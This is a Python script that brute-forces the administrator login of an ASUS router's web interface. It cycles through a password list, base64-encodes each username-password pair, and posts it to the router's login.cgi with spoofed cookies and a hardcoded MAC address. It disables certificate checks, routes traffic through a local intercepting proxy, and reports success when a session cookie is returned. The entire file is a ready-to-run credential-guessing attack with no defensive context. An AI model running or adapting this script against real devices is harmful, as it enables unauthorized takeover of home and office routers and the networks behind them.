import requests
import base64

# needed for self-signed certs or MITM
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

wordlist = ['true', 'false', 'P@55w0rd']
username = 'admin'
url = 'http://192.168.1.1/login.cgi'
referer = 'http://192.168.1.1/Main_Login.asp'
mac = '70:8b:c1:c3:ad:22'  #this is asus router MAC! 

PROXIES = {'http': 'localhost:8080', 'https': 'localhost:8080'}


def main():
	password = 'not found'

	for pwd in wordlist:
		print('[-] Trying password: ', pwd)
		credentials = '{0}:{1}'.format(username, pwd)
		authorization_token = base64.b64encode(str.encode(credentials))

		data = {'login_authorization': authorization_token, 'group_id':'action_mode', 'action_script':'action_wait=5', 'current_page':'Main_Login.asp', 'next_page':'index.asp'}
		cookie = {'hwaddr': mac, 'apps_last':'', 'clickedItem_tab':'0', 'dhcp_sortcol':'1', 'dhcp_sortmet':'1', 'asus_token':''}
		headers = {'Content-Type' : 'application/x-www-form-urlencoded', 'Referer': referer }

		r = requests.post(url, headers=headers, data = data, cookies=cookie, proxies=PROXIES, verify=False) #if you dont use proxies - remove "proxies" option
		if "Set-Cookie" in r.headers:
			password = pwd
			break

	print('[+] Password: ' + password)

if __name__ == '__main__':
	main()